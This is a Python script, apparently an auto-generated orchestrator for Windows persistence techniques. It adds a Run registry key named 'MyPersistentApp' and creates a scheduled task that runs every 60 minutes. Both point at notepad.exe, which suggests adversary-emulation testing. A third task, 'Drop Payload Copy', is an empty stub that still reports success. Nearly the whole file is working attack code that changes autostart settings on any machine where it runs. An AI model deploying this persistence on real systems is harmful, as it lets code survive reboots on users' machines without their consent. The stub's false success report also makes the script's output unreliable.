#!/usr/bin/env python3
import sys
import json
import time
import subprocess
from typing import Dict, Any
import winreg

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the registry path and value
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "MyPersistentApp"
        executable_path = r"C:\Windows\System32\notepad.exe"

        # Open the registry key
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            # Set the value for the application to run at logon
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, executable_path)

        result = {'success': True, 'key_path': key_path}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'success': False, 'key_path': ''}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    task_name = "MyScheduledTask"
    try:
        # Command to create a scheduled task that runs every 60 minutes
        command = [
            "schtasks", "/create", "/tn", task_name, "/tr", "notepad.exe",
            "/sc", "minute", "/mo", "60"
        ]
        subprocess.run(command, check=True, timeout=10)
        
        result = {
            "success": True,
            "task_name": task_name
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            "success": False,
            "task_name": task_name
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    try:
        result = {
        "success": "<boolean>",
        "file_path": "<string>"
}
        return {"success": True, "data": result,
                "metadata": {"task_id": "T3", "execution_time": time.time()-start, "is_stub": True}}
    except Exception as e:
        return {"success": False, "error": f"{type(e).__name__}: {e}",
                "metadata": {"task_id": "T3", "execution_time": time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Create Registry Run Key [persistence] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Create Registry Run Key): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Create Registry Run Key): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create Scheduled Task [persistence] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create Scheduled Task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create Scheduled Task): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Drop Payload Copy [persistence] ──
    try:
        r = task_T3(None)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Drop Payload Copy): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Drop Payload Copy): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))